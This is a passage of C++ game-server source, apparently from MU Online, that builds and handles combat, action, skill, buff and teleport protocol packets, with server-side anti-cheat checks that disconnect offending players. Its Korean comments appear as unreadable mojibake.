	PMSG_KILLPLAYER_EXT	pkillMsg;
	PHeadSetBE( (LPBYTE)&pkillMsg, 0x9C, sizeof( pkillMsg ) );		// ���� 0x16 �̾����� INT�� Ȯ���ϱ� ���� 0x9C�� ����.

	pkillMsg.NumberH	= HIBYTE( TargetIndex );
	pkillMsg.NumberL	= LOBYTE( TargetIndex );
	pkillMsg.ExpH		= HIWORD( exp );
	pkillMsg.ExpL		= LOWORD( exp );
	pkillMsg.DamageH    = HIBYTE( AttackDamage );
	pkillMsg.DamageL    = LOBYTE( AttackDamage );

	DataSend( aindex, (LPBYTE)&pkillMsg, pkillMsg.h.size );
}
#endif

// [0x17] ���� �׾��ٰ� �˸���.
#ifdef ADD_SKILL_WITH_COMBO
void GCDiePlayerSend(LPOBJECTSTRUCT lpObj, int TargetIndex, BYTE skill, int KillerIndex)
#else
void GCDiePlayerSend(LPOBJECTSTRUCT lpObj, int TargetIndex)
#endif
{
	PMSG_DIEPLAYER  pDieMsg;

	// ����Ʈ�� �ִ� ���������� �������� �׾��ٰ� �˸���.
	PHeadSetB((LPBYTE)&pDieMsg, 0x17, sizeof( pDieMsg ));
	pDieMsg.NumberH		= HIBYTE( TargetIndex );
	pDieMsg.NumberL		= LOBYTE( TargetIndex );

#ifdef ADD_SKILL_WITH_COMBO
	#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD
		pDieMsg.MagicNumberH = HIBYTE( skill );
		pDieMsg.MagicNumberL = LOBYTE( skill );
	#else	
		pDieMsg.Skill = skill;	
	#endif

	pDieMsg.KillerNumberH		= HIBYTE( KillerIndex );
	pDieMsg.KillerNumberL		= LOBYTE( KillerIndex );

	int iSize = pDieMsg.h.size;

	//if( skill != AT_SKILL_EXPHELL &&  skill != AT_SKILL_COMBO )
	//{	// �����̾�� �޺��϶���, ���� ������Ʈ�� �ε����� ������		
	//	iSize -= 2;
	//}
	MsgSendV2(lpObj, (LPBYTE)&pDieMsg, iSize);
	if( lpObj->Type == OBJTYPE_CHARACTER )
		DataSend(lpObj->m_Index, (LPBYTE)&pDieMsg, iSize);
#else
	MsgSendV2(lpObj, (LPBYTE)&pDieMsg, pDieMsg.h.size);
	if( lpObj->Type == OBJTYPE_CHARACTER )
		DataSend(lpObj->m_Index, (LPBYTE)&pDieMsg, pDieMsg.h.size);
#endif
}


//----------------------------------------------------------------------------
// [0x18] ĳ���Ͱ� Ư���� ������ ���Ѵٰ� �˸���.
#ifdef ADD_TRAP_OBJECT_EXTEND_20060731
void GCActionSend(LPOBJECTSTRUCT lpObj, BYTE ActionNumber, int aIndex, int aTargetIndex)
#else
void GCActionSend(LPOBJECTSTRUCT lpObj, BYTE ActionNumber, int aIndex)
#endif // ADD_TRAP_OBJECT_EXTEND_20060731
{
	PMSG_ACTIONRESULT	pActionResult;
		
	// �����ߴٸ� ����Ʈ���� �����鿡�� ���� ������ �˸���.
	
	PHeadSetB((LPBYTE)&pActionResult, 0x18, sizeof( pActionResult ));
	pActionResult.NumberH		= HIBYTE(aIndex);
	pActionResult.NumberL		= LOBYTE(aIndex);
	pActionResult.ActionNumber	= ActionNumber;

	pActionResult.Dir = lpObj->Dir;

#ifdef ADD_TRAP_OBJECT_EXTEND_20060731
	pActionResult.TargetNumberH = HIBYTE(aTargetIndex);
	pActionResult.TargetNumberL = LOBYTE(aTargetIndex);
#endif // ADD_TRAP_OBJECT_EXTEND_20060731

	MsgSendV2(lpObj, (LPBYTE)&pActionResult, pActionResult.h.size);	
}

void GCActionSend2(LPOBJECTSTRUCT lpObj, BYTE ActionNumber, int aIndex, int aTargetIndex)
{
	PMSG_ACTIONRESULT pActionResult;

	PHeadSetB((LPBYTE)&pActionResult, 0x18, sizeof(pActionResult));
	pActionResult.NumberH = SET_NUMBERH(aIndex);
	pActionResult.NumberL = SET_NUMBERL(aIndex);
	pActionResult.ActionNumber = ActionNumber;
	pActionResult.Dir = lpObj->Dir;
	pActionResult.TargetNumberH = SET_NUMBERH(aTargetIndex);
	pActionResult.TargetNumberL = SET_NUMBERL(aTargetIndex);

	MsgSendV2(lpObj, (LPBYTE)&pActionResult, pActionResult.h.size);
}
//----------------------------------------------------------------------------
// [0x18] ĳ���Ͱ� Ư���� ������ ���Ѵٰ� �˷ȴ�.
void CGActionRecv(LPPMSG_ACTION lpMsg, int aIndex)
{
	PMSG_ACTIONRESULT	pResult;

	if( !CHECK_LIMIT(aIndex, MAX_OBJECT) )
	{
		LogAdd("error : move protocol index error %s %d",__FILE__, __LINE__);
		return;
	}
	LPOBJECTSTRUCT	lpObj = (LPOBJECTSTRUCT)&gObj[aIndex];
	
	PHeadSetB((LPBYTE)&pResult, 0x18, sizeof( pResult ));

	pResult.ActionNumber = lpMsg->ActionNumber;
	pResult.NumberH = HIBYTE(aIndex);
	pResult.NumberL = LOBYTE(aIndex);

	lpObj->m_ActionNumber = lpMsg->ActionNumber;
	lpObj->Dir            = lpMsg->Dir;
	pResult.Dir           = lpObj->Dir;

#ifdef ADD_TRAP_OBJECT_EXTEND_20060731
	pResult.TargetNumberH = lpMsg->iTargetIndexH;
	pResult.TargetNumberL = lpMsg->iTargetIndexL;
#endif

	if( lpObj->m_ActionNumber == AT_SIT1 )
	{
		lpObj->m_ViewState = 2;
		lpObj->m_Rest      = lpObj->m_ActionNumber;
	}
	else if( lpObj->m_ActionNumber == AT_POSE1 )
	{
		lpObj->m_ViewState = 3;
		lpObj->m_Rest      = lpObj->m_ActionNumber;
	}
	else if( lpObj->m_ActionNumber == AT_HEALING1 )
	{
		lpObj->m_ViewState = 4;
		lpObj->m_Rest      = lpObj->m_ActionNumber;
	}

	int MVL = MAXVIEWPORTOBJECT;
	if( lpObj->Type == OBJTYPE_MONSTER ) MVL = MAX_MONVIEWPORTOBJECT;

	for( int n=0; n<MVL; n++ )
	{
		if( lpObj->VpPlayer2[n].type == OBJTYPE_CHARACTER )
		{
			if( lpObj->VpPlayer2[n].state != OBJST_NONE &&
				lpObj->VpPlayer2[n].state != OBJST_DIED &&
				lpObj->VpPlayer2[n].state != OBJST_DIECMD )
			{
				if( DataSend(lpObj->VpPlayer2[n].number, (LPBYTE)&pResult, pResult.h.size) == FALSE )
				{
					//LogAdd("error : index: %d number : %d",  aIndex, lpObj->VpPlayer2[n].number);
				}
			}
		}
	}
	
}

//----------------------------------------------------------------------------
// [0x19] ���� ����
void CGMagicAttack(LPPMSG_MAGICATTACK lpMsg, int aIndex)
{
	LPOBJECTSTRUCT	lpObj;
	LPOBJECTSTRUCT	lpTargetObj;
	int				usernumber;
	CMagicInf *		lpMagic;	
	
	usernumber = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);	

#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD
	WORD wMagicNumber = MAKEWORD( lpMsg->MagicNumberL, lpMsg->MagicNumberH );
#endif
		
	// ����� ��ȣ�� �߸����Դٸ�
	if(usernumber< 0 || (usernumber > (MAX_OBJECT-1))) 
	{
		LogAdd("error :%s %d %d", __FILE__, __LINE__, usernumber);
		return;
	}
	
	// �׾��ְų� ������ ������ �������
	if( (!gObj[usernumber].Live) || (gObj[usernumber].Connected < 2) )
		return;	

	if( gObj[aIndex].CloseCount >= 0 ) return;
	
#ifdef MODIFY_SAFEZONE_CHECK_ATTACK_20080903
	BYTE attr = MapC[gObj[aIndex].MapNumber].GetAttr(gObj[aIndex].X, gObj[aIndex].Y);
	
	if( ((attr&MAP_ATTR_SAFTYZONE) == MAP_ATTR_SAFTYZONE) )		// ���������� ��ų �ߵ� ���Ѵ�.
	{
		if( wMagicNumber == AT_SKILL_EXPHELL_START )
		{
			GCMagicAttackNumberSend( &gObj[aIndex], AT_SKILL_EXPHELL, aIndex, 1 );				
			gObjSetPosition( aIndex, gObj[aIndex].X, gObj[aIndex].Y );
			
			return;
		}
	}
#endif // MODIFY_SAFEZONE_CHECK_ATTACK_20080903

	lpObj = &gObj[aIndex];
	lpTargetObj = &gObj[usernumber];

	// ���� ������ ���� �˻�	
	int attackret = gObjCheckAttackArea(aIndex, usernumber);
	if( attackret )
	{
#ifdef CHECK_ATTACK_AREA
		lpObj->m_NotAttackAreaCount++;

	#ifdef MODIFY_HACKLOG_OF_ATTACK_20050518
		lpObj->m_NotAttackAreaCountFor10Min++;
	#endif

	#ifdef CHINA_HACKUSER_KICK_SYSTEM
		ChinaHackUserKick.InsertCataNCount(lpObj->m_Index);
	#endif

		if( gIsKickNotAttackAreaCountLimit )
		{
	#ifdef MODIFY_HACKLOG_OF_ATTACK_20050518
			if( lpObj->m_NotAttackAreaCountFor10Min >= gNotAttackAreaKickCount )
			{
		#ifdef CHINA_HACKUSER_KICK_SYSTEM
				ChinaHackLogFile.Output("[%s][%s] Kick NotAttackAreaKickCount Over User (%d) @%d", 
										lpObj->AccountID,
										lpObj->Name,
										lpObj->m_NotAttackAreaCount,
										lpObj->MapNumber);
		#else
					LogAddTD("[%s][%s] Kick NotAttackAreaKickCount Over User (%d, %d) @%d", 
							 lpObj->AccountID, 
							 lpObj->Name, 
							 lpObj->m_NotAttackAreaCountFor10Min, 
							 lpObj->m_NotAttackAreaCount,
							 lpObj->MapNumber);
		#endif
				CloseClient(lpObj->m_Index);					
				return;			
			}
	#else // else MODIFY_HACKLOG_OF_ATTACK_20050518
			// �õ� Ƚ���� �����̻� �Ѿ� ���� ű�� �����ϸ�
			if( lpObj->m_NotAttackAreaCount >= gNotAttackAreaKickCount )
			{
		#ifdef CHINA_HACKUSER_KICK_SYSTEM
				ChinaHackLogFile.Output("[%s][%s] Kick NotAttackAreaKickCount Over User (%d)", 
										lpObj->AccountID, lpObj->Name, lpObj->m_NotAttackAreaCount);
		#else
				LogAddTD("[%s][%s] Kick NotAttackAreaKickCount Over User (%d)", 
						  lpObj->AccountID, lpObj->Name, lpObj->m_NotAttackAreaCount);
		#endif
				CloseClient(lpObj->m_Index);					
				return;
			}
	#endif // MODIFY_HACKLOG_OF_ATTACK_20050518
		}
#else // else CHECK_ATTACK_AREA
		LogAddTD("[%s][%s] Try Attack In Not Attack Area [Protocol] (%s:%d,%d) errortype = %d", 
				lpObj->AccountID, lpObj->Name, lMsg.Get(lpObj->MapNumber+2000), lpObj->X, lpObj->Y, attackret);

		#ifdef MODIFY_KUNDUN_VIEWPORT_20060523
		// ��� ��ų ������ ������ ��� TargetNumber�� �ٽ� ���� �Ѵ�.
		if ( lpObj->Class == 275 )
		{
			lpObj->TargetNumber = -1;
		}
		#endif // MODIFY_KUNDUN_VIEWPORT_20060523

#endif // CHECK_ATTACK_AREA
		if( bIsIgnorePacketSpeedHackDetect )
		{
			return;
		}
	}
	
	if( lpObj->Type == OBJTYPE_CHARACTER )
	{	
		
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD 
		if( wMagicNumber == AT_SKILL_EXPHELL_START )
		{
			usernumber = AT_SKILL_EXPHELL_START;
		}
		lpMagic = gObjGetMagicSearch( lpObj, wMagicNumber );
#else
#ifdef CHANGE_MAGICATTACKPACKET		// ���� ������ȣ ��ſ� ��ų ��ȣ�� ����
		if( lpMsg->MagicNumber == AT_SKILL_EXPHELL_START )
		{
			usernumber = AT_SKILL_EXPHELL_START;
		}
		lpMagic = gObjGetMagicSearch(lpObj, lpMsg->MagicNumber);
#else
		lpMagic = gObjGetMagic(lpObj, lpMsg->MagicNumber);
#endif
#endif	// ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107

#ifdef MODIFY_SKILL_ICEARROW_AND_ADD_DEXTERITY_BUGFIX_20080820
		// 2008/08/20 ��ų �䱸ġ üũ - riverstyx
		{
			short nEnergy = lpObj->Energy + lpObj->AddEnergy;
			short nStrength = lpObj->Strength + lpObj->AddStrength;
			short nDexterity = lpObj->Dexterity + lpObj->AddDexterity;
			switch (wMagicNumber )
			{
			case AT_SKILL_ELFHARDEN:
				{
					//���̽��ַο� ���� �䱸ġ
					if (nDexterity < 646) return;
				} break;
			default:
				break;
			}
		}
#endif // MODIFY_SKILL_ICEARROW_AND_ADD_DEXTERITY_BUGFIX_20080820
		
		if( lpMagic == NULL )
		{
			return;
		}
#ifdef ADD_NEWPVP_PKFIELD
		if (lpMagic->m_Skill == AT_SKILL_RECALL_PARTY 
			&& (g_NewPVP.IsDuel(*lpObj) || g_NewPVP.IsDuel(*lpTargetObj)) )
		{
			return;
		}
#endif // ADD_NEWPVP_PKFIELD

#ifdef MASTER_LEVEL_SKILL_SYSTEM_20071122	// SkillGetRequireClass(...) 3������ �߰�
		if( MagicDamageC.SkillGetRequireClass(lpObj->Class, lpObj->ChangeUP, lpObj->ThirdChangeUp, lpMagic->m_Skill) < 1 ) return;
#else
#ifdef NEW_SKILL_FORSKYLAND
		if( MagicDamageC.SkillGetRequireClass(lpObj->Class, lpObj->ChangeUP, lpMagic->m_Skill) < 1 ) return;
#else
		if( MagicDamageC.SkillGetRequireClass(lpObj->Class, lpMagic->m_Skill) < 0 ) return;
#endif
#endif	// MASTER_LEVEL_SKILL_SYSTEM_20071122

#ifdef ADD_NEW_SKILL_FOR_CASTLE_01_20041116
		// ��å�� ���� ������ ������ �ʴ´�. 
		if( MagicDamageC.CheckStatus( lpMagic->m_Skill, lpObj->GuildStatus ) == FALSE ) 
		{
			LogAddC( LOGC_RED, "[0x19] CGMagicAttack() - Invalid Status" );
			return;
		}

		// ųī��Ʈ üũ
		if( MagicDamageC.CheckKillCount( lpMagic->m_Skill, lpObj->m_btKillCount) < 0 )
		{
			LogAddC( LOGC_RED, "[0x19] CGMagicAttack() - Invalid KillCount" );
			return;
		}
#endif

	}
	else 
	{
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD 
		lpMagic = gObjGetMagic( lpObj, wMagicNumber );
#else
		lpMagic = gObjGetMagic(lpObj, lpMsg->MagicNumber);
#endif
		if( lpMagic == NULL )
		{
			return;
		}
	}

#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// �ٹ� ��ȭ ������ üũ ����
	if( lpMagic->m_Skill != AT_SKILL_CROSSBOW && lpMagic->m_Skill != AT_SKILL_ML_STRENGTHEN_CROSSBOW )
#else
	if( lpMagic->m_Skill != AT_SKILL_CROSSBOW )
#endif
	{	// ������ üũ
		if( !gObjUseSkill.SpeedHackCheck(aIndex) )
			return;
	}

	// ��ų ��ȿ �Ÿ� üũ
#ifdef MODIFY_SKILL_CHECK_DISTANCE_20060413
	if ( gCheckSkillDistance(aIndex, usernumber, lpMagic->m_Skill) == FALSE )
	{
		// ī��Ʈ & ���� ���� ó��
	#ifdef MODIFY_SKILL_CHECK_DISTANCE_UPDATE_20060417
		#ifdef MODIFY_SKILL_CHECK_DISTANCE_UPDATE_02_20060421
			DWORD dwTick = GetTickCount() - lpObj->m_dwSkillDistanceErrorTick;
			if (  dwTick > g_iSkillDiatanceKickCheckTime * 1000 )
			{
				lpObj->m_iSkillDistanceErrorCount = 0;
				lpObj->m_dwSkillDistanceErrorTick = GetTickCount();
			}
		#endif
		++lpObj->m_iSkillDistanceErrorCount;
		if ( lpObj->m_iSkillDistanceErrorCount > g_iSkillDistanceKickCount )
		{
			// ���� ���� ó��. ���� ���� ���� ���� 0�� �ƴ� ��쿡 ó��
			if ( g_iSkillDistanceKick != 0 )
			{
				LogAddTD("[SKILL DISTANCE CHECK] [%s][%s] Kick Invalid Skill Area User. count(%d)", 
						  lpObj->AccountID, lpObj->Name, lpObj->m_iSkillDistanceErrorCount);
				CloseClient(lpObj->m_Index);
				return;
			}
			// ���� ���� ���� �ʴ� ��� count �� ����
			lpObj->m_iSkillDistanceErrorCount = 0;
		}
	#endif
		return;
	}
#endif
	
	gObjUseSkill.UseSkill(aIndex, usernumber, lpMagic);	
}


// [0x19] 1:1 ���� ���� 
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> INT
void GCMagicAttackNumberSend(LPOBJECTSTRUCT lpObj, WORD MagicNumber, int usernumber, BYTE skillsuccess)
#else
void GCMagicAttackNumberSend(LPOBJECTSTRUCT lpObj, BYTE MagicNumber, int usernumber, BYTE skillsuccess)
#endif
{
	PMSG_MAGICATTACK_RESULT	pAttack;

	PHeadSetBE((LPBYTE)&pAttack, 0x19, sizeof( pAttack ));

#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD 
	pAttack.MagicNumberH   = HIBYTE( MagicNumber );
	pAttack.MagicNumberL   = LOBYTE( MagicNumber );
#else
	pAttack.MagicNumber   = MagicNumber;
#endif
	pAttack.SourceNumberH = HIBYTE(lpObj->m_Index);
	pAttack.SourceNumberL = LOBYTE(lpObj->m_Index);	
	pAttack.TargetNumberH = HIBYTE(usernumber);
	pAttack.TargetNumberL = LOBYTE(usernumber);
	pAttack.TargetNumberH &= 0x7F;
	if( skillsuccess )
	{
		pAttack.TargetNumberH |= 0x80;
	}

	if( lpObj->Type == OBJTYPE_CHARACTER )
		DataSend(lpObj->m_Index, (LPBYTE)&pAttack, pAttack.h.size);

#ifdef CHAOSCASTLE_SYSTEM_20040408		// !!> . ���⼭ ī���� ĳ������ �������� �ʵǴ� ��ų���� �ߵ��Ǹ� ������ �ʴ´�.
	if (CHECK_CHAOSCASTLE(lpObj->MapNumber)) {
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ī���� ĳ������ �������� �ʵǴ� ��ų �߰�(0x19)
		if( g_MasterSkillSystem.CheckMasterLevelSkill( MagicNumber ) )
		{
			INT iBaseMLS = g_MasterSkillSystem.GetBaseMasterLevelSkill( MagicNumber );
			switch( iBaseMLS )
			{
			case AT_SKILL_ML_STRENGTHEN_MAGICDEFENSE:	// �ҿ�ٸ��� ��ȭ
			case AT_SKILL_ML_STRENGTHEN_KNIGHTADDLIFE:	// ���������� ��ȭ
			case AT_SKILL_ML_STRENGTHEN_HEALING:		// ġ�� ��ȭ
#ifdef UPDATE_MASTER_LEVEL_4RANK_20080428
			case AT_SKILL_ML_STRENGTHEN_DEFENSE:		// ����� ��� ��ȭ
			case AT_SKILL_ML_STRENGTHEN_ATTACK:			// ���ݷ� ��� ��ȭ
#endif	// UPDATE_MASTER_LEVEL_4RANK_20080428				
				return;							
			}
		}
		else
#endif	// ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107
		switch(MagicNumber) {
		case AT_SKILL_MAGICDEFENSE :	// �ҿ�ٸ���
		case AT_SKILL_KNIGHTADDLIFE :	// ����������
		case AT_SKILL_DEFENSE :			// �������
		case AT_SKILL_ATTACK :			// ���ݷ����
		case AT_SKILL_HEALING :			// ġ��
			return;
		}
	}
#endif
	
	MsgSendV2(lpObj, (LPBYTE)&pAttack, pAttack.h.size);
}


//////////////////////////////////////////////////////////////////////////////
// [0x1B] ���� ���� �����鿡�� ���� ������ ���� ������ �˸���.
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD
void GCMagicCancelSend(LPOBJECTSTRUCT lpObj, WORD MagicNumber)
#else
void GCMagicCancelSend(LPOBJECTSTRUCT lpObj, BYTE MagicNumber)
#endif
{
	PMSG_MAGICCANCEL	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x1B, sizeof( pMsg ));

#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD
	pMsg.MagicNumberH = HIBYTE( MagicNumber );
	pMsg.MagicNumberL = LOBYTE( MagicNumber );
#else
	pMsg.MagicNumber = MagicNumber;
#endif
	pMsg.NumberH = HIBYTE(lpObj->m_Index);
	pMsg.NumberL = LOBYTE(lpObj->m_Index);
	
	if( lpObj->Type == OBJTYPE_CHARACTER )
		DataSend(lpObj->m_Index, (LPBYTE)&pMsg, pMsg.h.size);

	MsgSendV2(lpObj, (LPBYTE)&pMsg, pMsg.h.size);
}

#ifdef ITEM_ADD_OPTION_20061019
	#ifdef ADD_PARTIALY_CHARGE_PERIOD_SYSTEM_20070205
	void GCUseEffectItem(LPOBJECTSTRUCT lpObj, int iEffectUseOption, int iOptionType, int iEffectType, int iLeftTime)
	#else
	void GCUseEffectItem(LPOBJECTSTRUCT lpObj, int iEffectUseOption, int iOptionType, int iEffectType)
	#endif // ADD_PARTIALY_CHARGE_PERIOD_SYSTEM_20070205
{
	PMSG_USEEFFECTITEM	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x2D, sizeof( pMsg ));

	pMsg.byEffectOption = (BYTE)iEffectUseOption;
	pMsg.wOptionType	= (WORD)iOptionType;
	pMsg.wEffectType	= (WORD)iEffectType;

#ifdef ADD_PARTIALY_CHARGE_PERIOD_SYSTEM_20070205
	pMsg.iLeftTime		= iLeftTime;
#endif // ADD_PARTIALY_CHARGE_PERIOD_SYSTEM_20070205
	
#ifdef MODIFY_BUFF_SYSTEM_EXTENTION_20070917
	// ���⼭�� 0�� �ʱ�ȭ �ؼ� ������.
	pMsg.btBuffEffectType	= 0;
#endif // MODIFY_BUFF_SYSTEM_EXTENTION_20070917

	if( lpObj->Type == OBJTYPE_CHARACTER )
	{
		DataSend(lpObj->m_Index, (LPBYTE)&pMsg, pMsg.h.size);
	}
}
#endif // ITEM_ADD_OPTION_20061019

#ifdef ADD_INFINITY_ARROW_CANCEL_20060516
//----------------------------------------------------------------------------
// CG [0x1B] ����ڰ� ���Ӹ����� ���� ����ߴ�.
//----------------------------------------------------------------------------
void CGMagicCancel( LPPMSG_MAGICCANCEL lpMsg, int aIndex )
{
	if( !CHECK_LIMIT(aIndex, MAX_OBJECT) )
		return;
	
	LPOBJECTSTRUCT	lpObj = &gObj[aIndex];

	// ���Ǵ�Ƽ ��ų�� ���� ���
#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD 
	WORD wMagicNumber = MAKEWORD( lpMsg->MagicNumberL, lpMsg->MagicNumberH );
	if( wMagicNumber == AT_SKILL_INFINITY_ARROW )
#else
	if( lpMsg->MagicNumber == AT_SKILL_INFINITY_ARROW )
#endif
	{
		// 1. ����ڰ� ���Ǵ�Ƽ ��ų�� ������ΰ�?
#ifdef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
		if( gObjCheckUsedBuffEffect( lpObj, BUFFTYPE_INFINITY_ARROW ) == true )
		{
			gObjRemoveBuffEffect( lpObj, BUFFTYPE_INFINITY_ARROW );
		}
#else
		if( lpObj->m_iMuseElfInfinityArrowSkillTime > 0 )
		{
			// 2. ������� ���Ǵ�Ƽ ��ų�� �ʱ�ȭ�Ѵ�.
			lpObj->m_iMuseElfInfinityArrowSkillTime = 0;

			// 3. ���Ǵ�Ƽ ��ų�� ���� ���¸� �ʱ�ȭ�Ѵ�.
			DEL_VIEWSKILLSTATE( lpObj->m_ViewSkillState, STATE_INFINITY_ARROW );
			GCStateInfoSend( lpObj, 0, STATE_INFINITY_ARROW );		
		}	
#endif // MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
	}	
#ifdef ADD_SEASON4_NEW_SKILL_20080522	// �������� ��ų ���
	else if( wMagicNumber == AT_SKILL_MAGICPOWRER )
	{
		if( gObjCheckUsedBuffEffect( lpObj, BUFFTYPE_MAGIC_POWER_INC ) == true )
		{
			gObjRemoveBuffEffect( lpObj, BUFFTYPE_MAGIC_POWER_INC );
		}
	}
#endif // ADD_SEASON4_NEW_SKILL_20080522	
}
#endif	// #ifdef ADD_INFINITY_ARROW_CANCEL_20060516

#ifdef ADD_NEW_MONSTER_SYSTEM_01_20050714
//----------------------------------------------------------------------------
// GC [0x69] ���Ͱ� ��ų�� ����ߴ�.
//----------------------------------------------------------------------------
void GCUseMonsterSkillSend( LPOBJECTSTRUCT lpObj, LPOBJECTSTRUCT lpTargetObj, INT iSkillNumber )
{
	PMSG_USE_MONSTERSKILL pMsg;
	PHeadSetB((LPBYTE)&pMsg, 0x69, sizeof( pMsg ));

#ifdef ADD_MASTER_LEVEL_SKILL_SYSTEM_ACTIVE_20080107	// ��ų��ȣ BYTE -> WORD
	pMsg.btMonsterSkillNumberH	= HIBYTE( iSkillNumber );
	pMsg.btMonsterSkillNumberL	= LOBYTE( iSkillNumber );
#else
	pMsg.btMonsterSkillNumber	= iSkillNumber;
#endif
	pMsg.wObjIndex				= lpObj->m_Index;
	pMsg.wTargetObjIndex		= lpTargetObj->m_Index;

	if( lpObj->Type == OBJTYPE_CHARACTER )
		DataSend(lpObj->m_Index, (LPBYTE)&pMsg, pMsg.h.size);

	MsgSendV2(lpObj, (LPBYTE)&pMsg, pMsg.h.size);
}

#endif

//////////////////////////////////////////////////////////////////////////////
// [0x07] ���� ���� �����鿡�� ���� ���¸� ������
#ifndef MODIFY_SEND_BUFFEFFECT_IN_VIEWPORT_20071121
#ifdef EXPAND_VIEWSKILLSTATE_WORD_TO_INT_20041122
void GCStateInfoSend(LPOBJECTSTRUCT lpObj, BYTE state, INT ViewSkillState)
#else
void GCStateInfoSend(LPOBJECTSTRUCT lpObj, BYTE state, WORD ViewSkillState)
#endif
{
	PMSG_VIEWSKILLSTATE	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x07, sizeof( pMsg ));

	pMsg.State = state;

#ifdef MODIFY_BUFF_SYSTEM_EXTENTION_20070917
	pMsg.BuffEffectCount = gObjMakeViewportState( lpObj, pMsg.BuffEffectList );
	pMsg.h.size -= MAX_BUFF_SLOT_INDEX - pMsg.BuffEffectCount;
#else
	pMsg.ViewSkillState = ViewSkillState;
#endif // MODIFY_BUFF_SYSTEM_EXTENTION_20070917
	pMsg.NumberH = HIBYTE(lpObj->m_Index);
	pMsg.NumberL = LOBYTE(lpObj->m_Index);
	
	if( lpObj->Type == OBJTYPE_CHARACTER )
		DataSend(lpObj->m_Index, (LPBYTE)&pMsg, pMsg.h.size);

#ifndef MODIFY_BUFF_SYSTEM_EXTENTION_20070917					// !! NOT
	#ifdef CHAOSCASTLE_SYSTEM_20040408		// !!> . ����ڰ� ī���� ĳ���ȿ� �ִٸ� ����Ʈ�� �����ϱ� ���� ��ų����Ʈ���� ����� �����Ѵ�.
	if (CHECK_CHAOSCASTLE(lpObj->MapNumber)) {
//		pMsg.ViewSkillState &= ~STATE_REDUCE_MAGICDEFENSE;		// �ҿ�ٸ���
//		pMsg.ViewSkillState &= ~STATE_ADD_LIFE;					// ����������
//		pMsg.ViewSkillState &= ~STATE_ATTACK;					// ���ݷ����
//		pMsg.ViewSkillState &= ~STATE_DEFENSE;					// �������
		pMsg.ViewSkillState = 0;
	}
	#endif
#endif // MODIFY_BUFF_SYSTEM_EXTENTION_20070917

	MsgSendV2(lpObj, (LPBYTE)&pMsg, pMsg.h.size);
}
#endif // MODIFY_SEND_BUFFEFFECT_IN_VIEWPORT_20071121

#ifdef MODIFY_BUFF_SYSTEM_EXTENTION_20070917
#ifdef MODIFY_SEND_BUFFEFFECT_IN_VIEWPORT_20071121
void GCBuffStateInfoSend(LPOBJECTSTRUCT lpObj, BYTE State, BYTE BuffIndex)
#else
void GCBuffStateInfoSend(LPOBJECTSTRUCT lpObj, eBuffStateType BuffState)
#endif // MODIFY_SEND_BUFFEFFECT_IN_VIEWPORT_20071121
{
	PMSG_VIEWSKILLSTATE pMsg;
	BYTE BuffCount = 0;

	PHeadSetB((LPBYTE)&pMsg, 0x07, sizeof( pMsg ) );

#ifdef MODIFY_SEND_BUFFEFFECT_IN_VIEWPORT_20071121
	pMsg.State = State;
#else
	pMsg.State = BuffState;
#endif // MODIFY_SEND_BUFFEFFECT_IN_VIEWPORT_20071121
	pMsg.NumberH = HIBYTE( lpObj->m_Index );
	pMsg.NumberL = LOBYTE( lpObj->m_Index );

#ifdef MODIFY_SEND_BUFFEFFECT_IN_VIEWPORT_20071121
	pMsg.BuffIndex = BuffIndex;
#else
	// ���� ����Ʈ�� �����.
	BuffCount = gObjMakeViewportState( lpObj, pMsg.BuffEffectList );
	pMsg.BuffEffectCount = BuffCount;

	pMsg.h.size = ( pMsg.h.size - ( MAX_BUFF_SLOT_INDEX - BuffCount ) );
#endif // MODIFY_SEND_BUFFEFFECT_IN_VIEWPORT_20071121

	if( lpObj->Type == OBJTYPE_CHARACTER )
	{
		DataSend( lpObj->m_Index, (LPBYTE)&pMsg, pMsg.h.size );
	}

	if( CHECK_CHAOSCASTLE( lpObj->MapNumber ) )
	{
#ifdef MODIFY_SEND_BUFFEFFECT_IN_VIEWPORT_20071121
		return;
#else
		pMsg.BuffEffectCount = 0;
#endif // MODIFY_SEND_BUFFEFFECT_IN_VIEWPORT_20071121
	}

	MsgSendV2( lpObj, (LPBYTE)&pMsg, pMsg.h.size );
}
#endif // MODIFY_BUFF_SYSTEM_EXTENTION_20070917

//////////////////////////////////////////////////////////////////////////////
// [0x1C] ���� �̵��� ����ߴ�.
void CGTeleportRecv(LPPMSG_TELEPORT lpMsg, int aIndex)
{

#ifdef ADD_NEW_SKILL_FOR_CASTLE_02_20050531
	if( !CHECK_LIMIT(aIndex, MAX_OBJECT) )
		return;

	// ������ �ɷ� ������ �����̵� �� �� ����.
#ifdef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
#ifdef ADD_SEASON_3_NEW_CHARACTER_SUMMONER_20070912	// �������¿����� �̵�����
	if( gObjCheckUsedBuffEffect( &gObj[aIndex], BUFFTYPE_STUN ) == true 
		|| ( gObjCheckUsedBuffEffect( &gObj[aIndex], BUFFTYPE_SLEEP ) == true ))
#else
